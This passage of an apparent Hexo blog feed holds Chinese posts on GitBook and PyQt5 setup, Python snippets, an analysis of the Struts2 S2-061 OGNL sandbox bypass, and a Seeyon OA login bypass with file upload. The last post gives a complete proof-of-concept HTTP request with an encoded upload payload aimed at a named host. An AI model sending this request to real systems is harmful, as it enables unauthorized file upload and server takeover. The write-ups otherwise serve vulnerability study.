<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210708090946536.png" alt="image-20210708090946536"></p>
<p>运行后大致如下图，introduction就是readme.md的内容</p>
<p>左侧的目录就是summary.md的内容</p>
<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210708090518889.png" alt="image-20210708090518889"></p>
<p>可以按个人所需安装一些有用的插件：</p>
<p>建议直接npm，感觉gitbook install很慢</p>
<p>比如加个页脚：</p>
<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210708091106973.png" alt="image-20210708091106973"></p>
<p>然后在文件夹下生成一个book.json文件，在里面填写配置和插件信息</p>
<p>我的book.json文件是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;title&quot; : &quot;kamivul&quot;,</span><br><span class="line">  &quot;author&quot; : &quot;0xkami&quot;,</span><br><span class="line">  &quot;description&quot; : &quot;漏洞复现记录&quot;,</span><br><span class="line">  &quot;language&quot; : &quot;zh-hans&quot;,</span><br><span class="line">  &quot;plugins&quot;: [&quot;chapter-fold&quot;,&quot;back-to-top-button&quot;,&quot;code&quot;,&quot;copy-code-button&quot;,&quot;-lunr&quot;, &quot;-search&quot;, &quot;search-pro&quot;,&quot;splitter&quot; ,&quot;tbfed-pagefooter&quot;],</span><br><span class="line">  &quot;pluginsConfig&quot;: &#123;</span><br><span class="line">        &quot;tbfed-pagefooter&quot;: &#123;</span><br><span class="line">            &quot;copyright&quot;:&quot;--by 0xkami&quot;,</span><br><span class="line">            &quot;modify_label&quot;: &quot;该文件修订时间：&quot;,</span><br><span class="line">            &quot;modify_format&quot;: &quot;YYYY-MM-DD HH:mm:ss&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>效果如图：</p>
<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210708091242739.png" alt="image-20210708091242739"></p>
<h5 id="ps："><a href="#ps：" class="headerlink" title="ps："></a>ps：</h5><p>还不知道要不要绑到这个博客域名里，毕竟太菜了</p>
]]></content>
      <tags>
        <tag>gitbook</tag>
      </tags>
  </entry>
  <entry>
    <title>mac下pyqt5+pycharm的环境配置</title>
    <url>/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>因为最近学习了很多，然后写了一些小的脚本，想合成一下，就研究了一下python的图形化编程，配置了一上午，也踩了点坑，终于配置成功了。</p>
<a id="more"></a>

<h5 id="0x1-在pycharm中安装库文件"><a href="#0x1-在pycharm中安装库文件" class="headerlink" title="0x1 在pycharm中安装库文件"></a>0x1 在pycharm中安装库文件</h5><p>PyQt5和pyqt5-tools，会附带下一些其他的库文件的</p>
<p><img src="/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20210610150145658.png" alt="image-20210610150145658"></p>
<p>下载源：</p>
<p><img src="/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20210610150220633.png" alt="image-20210610150220633"></p>
<h5 id="0x2-安装external-tools"><a href="#0x2-安装external-tools" class="headerlink" title="0x2 安装external tools"></a>0x2 安装external tools</h5><p>在tools里面，配置qt designer和pyuic</p>
<p>路径如下：</p>
<p><strong>qt designer：</strong></p>
<p>program：site-packages/qt5_applications/Qt/bin/Designer.app</p>
<p><strong>pyuic：</strong></p>
<p>program：项目python的路径</p>
<p>arguments：-m PyQt5.uic.pyuic  $FileName$ -o $FileNameWithoutExtension$.py</p>
<p><img src="/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20210610151237291.png" alt="image-20210610151237291"></p>
<p><img src="/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20210610151320248.png" alt="image-20210610151320248"></p>
<p>此时我们简单的配置就完成了</p>
<h5 id="0x3-运行"><a href="#0x3-运行" class="headerlink" title="0x3 运行"></a>0x3 运行</h5><p>使用qt designer生成一个ui文件在文件夹下，然后使用pyuic转换成py文件</p>
<p><img src="/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20210610152501223.png" alt="image-20210610152501223"></p>
<p>接下来我们在test里面调用它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import QApplication, QMainWindow</span><br><span class="line">import ui #ui.py</span><br><span class="line">class MyWindow(QMainWindow, ui.Ui_MainWindow):</span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(MyWindow, self).__init__(parent)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    myWin &#x3D; MyWindow()</span><br><span class="line">    myWin.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<p>此时出现了一个问题：</p>
<p><img src="/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20210610153155166.png" alt="image-20210610153155166"></p>
<p>解决方法：看了网上很多的都没用，尝试了下在pycharm里添加环境变量，就成功了</p>
<p><img src="/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20210610152929133.png" alt="image-20210610152929133"></p>
<p><img src="/2021/06/10/mac%E4%B8%8Bpyqt5-pycharm%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20210610154327948.png" alt="image-20210610154327948"></p>
]]></content>
      <tags>
        <tag>pyqt5</tag>
      </tags>
  </entry>
  <entry>
    <title>python小脚本合集</title>
    <url>/2021/07/08/python%E5%B0%8F%E8%84%9A%E6%9C%AC%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>一些常用功能</p>
<a id="more"></a>

<p>打开json：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(jsonfile, &#39;r&#39;, encoding&#x3D;&#39;utf8&#39;)as f:</span><br><span class="line">        json_data &#x3D; json.load(f)</span><br></pre></td></tr></table></figure>

<p>输出到json：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(jsonoutfile, &#39;a&#39;, encoding&#x3D;&#39;utf8&#39;)as fp:</span><br><span class="line">     json.dump(templateData, fp)</span><br><span class="line">     fp.write(&#39;\n&#39;)#加了一个换行</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cvedatas &#x3D; []</span><br><span class="line">cvedatas.append(templateData)</span><br><span class="line">with open(&quot;cve.json&quot;, &#39;a&#39;, encoding&#x3D;&#39;utf8&#39;)as f:</span><br><span class="line">    json.dump(cvedatas, f, ensure_ascii&#x3D;False)</span><br></pre></td></tr></table></figure>

<p>遍历目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">files &#x3D; os.listdir(cacheDirPath)</span><br><span class="line">    for file in files:</span><br><span class="line">        json_transfer(os.path.join(cacheDirPath, file), jsonFile)</span><br></pre></td></tr></table></figure>

<p>翻译有道：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_translate_youdao(word):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;fanyi.youdao.com&#x2F;translate?smartresult&#x3D;dict&amp;smartresult&#x3D;rule&quot;</span><br><span class="line">    Form_data &#x3D; &#123;</span><br><span class="line">        &quot;i&quot;: word,</span><br><span class="line">        &quot;from&quot;: &quot;AUTO&quot;,</span><br><span class="line">        &quot;to&quot;: &quot;AUTO&quot;,</span><br><span class="line">        &quot;smartresult&quot;: &quot;dict&quot;,</span><br><span class="line">        &quot;client&quot;: &quot;fanyideskweb&quot;,</span><br><span class="line">        &quot;salt&quot;: &quot;1512399450582&quot;,</span><br><span class="line">        &quot;sign&quot;: &quot;78181ebbdcb38de9b4a3f4cd1d38816b&quot;,</span><br><span class="line">        &quot;doctype&quot;: &quot;json&quot;,</span><br><span class="line">        &quot;version&quot;: &quot;2.1&quot;,</span><br><span class="line">        &quot;keyfrom&quot;: &quot;fanyi.web&quot;,</span><br><span class="line">        &quot;action&quot;: &quot;FY_BY_CLICKBUTTION&quot;,</span><br><span class="line">        &quot;typoResult&quot;: &quot;false&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        response &#x3D; requests.post(url, data&#x3D;Form_data)</span><br><span class="line">        content &#x3D; json.loads(response.text)</span><br><span class="line">        result &#x3D; content[&quot;translateResult&quot;][0][0][&quot;tgt&quot;]</span><br><span class="line">        return result</span><br><span class="line">    except:</span><br><span class="line">        return &quot;wrong!&quot;</span><br></pre></td></tr></table></figure>

<p>根据正则匹配内容修改文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tem1 &#x3D; &#39;script_template(&quot;FullScan&quot;&#39;</span><br><span class="line">with open(xxfile, &#39;r&#39;, encoding&#x3D;&#39;utf8&#39;)as f:</span><br><span class="line">    with open(&quot;final-&quot;+xxfile, &quot;w&quot;, encoding&#x3D;&quot;utf-8&quot;)as f3:</span><br><span class="line">        for line in f:</span><br><span class="line">            f3.write(re.sub(&#39;script_template\(&quot;.*&quot;&#39;, tem1, line))</span><br></pre></td></tr></table></figure>

<p>不区分大小写匹配两个字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for key in databasekey:</span><br><span class="line">    if(s1.lower().rfind(key.lower())) &#x3D;&#x3D; -1 :</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        print(s1 + &quot;:yes&quot;)</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>s2-061漏洞复现及分析文档</title>
    <url>/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<h4 id="s2-061漏洞复现及分析文档"><a href="#s2-061漏洞复现及分析文档" class="headerlink" title="s2-061漏洞复现及分析文档"></a>s2-061漏洞复现及分析文档</h4><a id="more"></a>

<h5 id="0x0-漏洞情况"><a href="#0x0-漏洞情况" class="headerlink" title="0x0 漏洞情况"></a>0x0 漏洞情况</h5><h6 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h6><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞（CVE-2020-17530）。S2-061是对S2-059沙盒进行的绕过。攻击者可构造特殊的OGNL表达式，造成远程代码执行。</p>
<h6 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h6><p>Struts 2.0.0 - Struts 2.5.25</p>
<h5 id="0x1-前置知识"><a href="#0x1-前置知识" class="headerlink" title="0x1 前置知识"></a>0x1 前置知识</h5><h6 id="0x11-Struts2标签解析"><a href="#0x11-Struts2标签解析" class="headerlink" title="0x11:Struts2标签解析"></a>0x11:Struts2标签解析</h6><p>Struts2 会对某些标签属性(比如 id) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 x 的值我们可控时，我们再传入一个 %{payload} 即可造成OGNL表达式执行。</p>
<h6 id="0x12-OGNL语言"><a href="#0x12-OGNL语言" class="headerlink" title="0x12:OGNL语言"></a>0x12:OGNL语言</h6><p>OGNL（Object-Graph Navigation  Language）–对象图导航语言。Struts2框架使用它作为默认的表达式语言，用于获取与设置Java对象的表达式语言，还附加一些例如集合投影、过滤、Lambda表达式的功能。</p>
<p>OGNL中有两个常用的类：</p>
<ul>
<li><p>ognl.Ognl类：主要用来解析和解释执行OGNL表达式</p>
</li>
<li><p>ognl.OgnlContext类：这个类为OGNL表达式提供了一个执行环境，这个类实现了Map接口，允许通过put(key,obj)方法向OgnlContext环境中方式各种类型的对象，需要注意的是在OgnlContext中对象分为两种，第一种是叫做root对象（根对象），在整个OgnlContext中有且最多只能有一个根对象，可以通过调用OgnlContext.setRoot(obj)设置为根对象，另外一种就是OgnlContext中的普通对象，这种个数类型不受限制。要获取普通对象的属性值，只能通过“#对象名.name”的方式去获取属性值，且在对象的类型中要提供getName方法。</p>
</li>
</ul>
<h5 id="0x2-漏洞原理分析"><a href="#0x2-漏洞原理分析" class="headerlink" title="0x2 漏洞原理分析"></a>0x2 漏洞原理分析</h5><p>已知OGNL沙盒的限制如下：</p>
<ul>
<li><p>无法new一个对象</p>
</li>
<li><p>无法调用黑名单类和包的方法、属性</p>
</li>
<li><p>无法调用静态方法</p>
</li>
<li><p>无法直接执行命令</p>
</li>
</ul>
<p>同时在ognl中，默认已经无法直接调用诸如Runtime等方法用来执行命令，如下：</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210174949997.png" alt="image-20201210174949997"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (AO_SETACCESSIBLE_REF !&#x3D; null &amp;&amp; AO_SETACCESSIBLE_REF.equals(method) || AO_SETACCESSIBLE_ARR_REF !&#x3D; null &amp;&amp; AO_SETACCESSIBLE_ARR_REF.equals(method) || SYS_EXIT_REF !&#x3D; null &amp;&amp; SYS_EXIT_REF.equals(method) || SYS_CONSOLE_REF !&#x3D; null &amp;&amp; SYS_CONSOLE_REF.equals(method) || AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) || ClassResolver.class.isAssignableFrom(methodDeclaringClass) || MethodAccessor.class.isAssignableFrom(methodDeclaringClass) || MemberAccess.class.isAssignableFrom(methodDeclaringClass) || OgnlContext.class.isAssignableFrom(methodDeclaringClass) || Runtime.class.isAssignableFrom(methodDeclaringClass) || ClassLoader.class.isAssignableFrom(methodDeclaringClass) || ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) || AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)</span><br></pre></td></tr></table></figure>

<p>所以需要一一绕过这些限制。</p>
<h6 id="0x21-创建一个对象"><a href="#0x21-创建一个对象" class="headerlink" title="0x21 创建一个对象"></a>0x21 创建一个对象</h6><p>在context的application中，org.apache.tomcat.SimpleInstanceManager中可以实例化一个无参构造函数。</p>
<p>利用newInstance 方法，className 参数可控，就可以实例化任意无参构造方法的类并返回。</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">  public Object newInstance(String className) throws IllegalAccessException,</span><br><span class="line">      InvocationTargetException, NamingException, InstantiationException,</span><br><span class="line">      ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">    Class&lt;?&gt; clazz &#x3D; Thread.currentThread().getContextClassLoader().loadClass(className);</span><br><span class="line">    return prepareInstance(clazz.getConstructor().newInstance());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h6 id="0x22-间接获取ognl-context"><a href="#0x22-间接获取ognl-context" class="headerlink" title="0x22  间接获取ognl context"></a>0x22  间接获取ognl context</h6><p>org.apache.commons.collections.BeanMap 这个类存在无参公开的构造方法：</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210174129548.png" alt="image-20201210174129548"></p>
<p>跟进 this.initialise()，可以看到是把传入对象的class当做bean，并且传入name值。</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210175445871.png" alt="image-20201210175445871"></p>
<p>get方法如下，通过我们传入的name值，调用 getreadMethods 中对应的 getXxx 方法</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210174211228.png" alt="image-20201210174211228"></p>
<p>以下是getreadmethod方法：调用 readMethods 中对应的 getxxx方法。</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210174225413.png" alt="image-20201210174225413"></p>
<p>而在com.opensymphony.xwork2.ognl.OgnlValueStack中，存在getContext方法，因此可以利用 BeanMap 间接获取到 OgnlContext。</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210174000271.png" alt="image-20201210174000271"></p>
<h6 id="0x23-清空黑名单"><a href="#0x23-清空黑名单" class="headerlink" title="0x23 清空黑名单"></a>0x23 清空黑名单</h6><p>在ognl的securityMemberAccess有存放黑名单，我们需要将黑名单置空，才可以任意调用类。</p>
<p>通过beanMap中的put方法调用setExculdedClasses和setExcludedPackageNames可以覆盖掉黑名单，我们就可以实例化任意黑名单中的类。</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210175929284.png" alt="image-20201210175929284"></p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210174039736.png" alt="image-20201210174039736"></p>
<h6 id="0x24-寻找存在无参构造函数，又可以命令执行的类"><a href="#0x24-寻找存在无参构造函数，又可以命令执行的类" class="headerlink" title="0x24 寻找存在无参构造函数，又可以命令执行的类"></a>0x24 寻找存在无参构造函数，又可以命令执行的类</h6><p>黑名单中的freemarker.template.utility.Execute类存在无参构造方法Execute(),可以利用exec直接执行命令</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210174340623.png" alt="image-20201210174340623"></p>
<h5 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h5><p>环境：</p>
<p>在docker的s2-059环境中使用cat &gt; pom.xml &lt;&lt; EOF命令修改pom.xml，添加依赖包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt;</span><br><span class="line">     &lt;version&gt;3.2.2&lt;&#x2F;version&gt;</span><br><span class="line">   &lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>

<p>攻击：</p>
<p>根据漏洞原理编写poc，发包，即可看到返回的页面中执行了poc中的whoami命令</p>
<p><img src="/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/image-20201210182827945.png" alt="image-20201210182827945"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>apaches struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>seeyonOA-ajax未授权访问及任意文件上传漏洞</title>
    <url>/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>参考：</p>
<a id="more"></a>

<p>1、<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</a></p>
<p>2、宽字节：<a href="https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA">https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA</a></p>
<h5 id="0x1-原理："><a href="#0x1-原理：" class="headerlink" title="0x1 原理："></a>0x1 原理：</h5><p>OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。</p>
<p>CTPHandlerInterceptor先判断是否为ajax请求，生成ignoreUrl。User.isIgnoreUrl可以根据ignoreUrl判断是否需要重定向到用户登录页面。所以我们只要使用特定的ignoreUrl就可以绕过登录，访问被保护的接口，比如文件上传接口。</p>
<h5 id="0x2-复现："><a href="#0x2-复现：" class="headerlink" title="0x2 复现："></a>0x2 复现：</h5><p>poc:</p>
<p><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1 Host: oatest.dptech.com:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 3485</code></p>
<p><code>managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00</code></p>
<p>成功的话会返回：</p>
<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113093745161.png" alt="image-20210113093745161"></p>
